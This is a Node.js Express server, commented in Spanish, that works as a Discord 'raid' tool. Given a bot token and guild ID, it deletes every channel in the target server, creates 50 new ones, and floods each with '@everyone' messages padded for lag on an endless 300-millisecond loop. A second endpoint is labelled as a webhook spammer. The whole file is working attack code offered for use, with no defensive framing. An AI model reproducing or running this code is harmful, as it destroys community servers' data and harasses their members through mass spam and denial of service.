const express = require('express');
const { Client, IntentsBitField, ChannelType, ActivityType } = require('discord.js');
const app = express();

app.use(express.json());
app.use(express.static('public'));

app.post('/api/run-raid', async (req, res) => {
    const { token, guildId, msg, channelName, myWebsite } = req.body;
    const bot = new Client({ 
        intents: [IntentsBitField.Flags.Guilds, IntentsBitField.Flags.GuildMessages] 
    });

    try {
        await bot.login(token);
        bot.once('ready', async () => {
            // STATUS DE STREAMING PARA PROMOCIÓN
            bot.user.setActivity("ELITE MULTITOOL", {
                type: ActivityType.Streaming,
                url: myWebsite || "https://twitch.tv" 
            });

            const guild = await bot.guilds.fetch(guildId).catch(() => null);
            if (!guild) return res.status(404).json({ error: "Bot no está en el servidor" });

            // 1. BORRADO MASIVO PARALELO (INSTANTÁNEO)
            const channels = await guild.channels.fetch();
            await Promise.all(channels.map(ch => ch.delete().catch(() => {})));

            // 2. ATAQUE DE CANALES Y RÁFAGA DE MENSAJES (MÁXIMO LAG)
            const lagMsg = (msg || "@everyone RAIDED BY ELITE") + "\n" + "░".repeat(500); // Caracteres pesados para lag

            for (let i = 0; i < 50; i++) {
                guild.channels.create({
                    name: channelName || "raid-by-elite",
                    type: ChannelType.GuildText
                }).then(async (ch) => {
                    // Ráfaga de 15 mensajes instantáneos por canal
                    const burst = Array(15).fill(lagMsg);
                    await Promise.all(burst.map(m => ch.send(m).catch(() => {})));

                    // Bucle de spam infinito (cada 300ms)
                    setInterval(() => {
                        ch.send(lagMsg).catch(() => {});
                    }, 300);
                }).catch(() => {});
            }
            res.json({ success: true });
        });
    } catch (err) {
        res.status(401).json({ error: "Token o permisos inválidos" });
    }
});

// Endpoint para el Webhook Spammer
app.post('/api/webhook', async (req, res) => {
    const { url, message } = req.body;
    try {
        const axios = require('axios');
        await axios.post(url, { content: message });
        res.json({ success: true });
    } catch (e) { res.status(400).send(); }
});

app.listen(3000, () => console.log(">>> Elite Multi-Tool Online en Puerto 3000"));

